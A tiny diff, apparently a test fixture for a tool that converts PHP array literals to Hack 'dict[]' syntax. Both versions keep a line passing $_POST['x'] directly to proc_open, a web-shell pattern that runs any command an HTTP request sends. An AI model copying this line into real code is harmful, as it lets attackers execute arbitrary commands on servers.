@@ -1,2 +1,2 @@
-$arr = [];
-$cb = proc_open($_POST['x'], [], $arr);
+$arr = dict[];
+$cb = proc_open($_POST['x'], dict[], $arr);
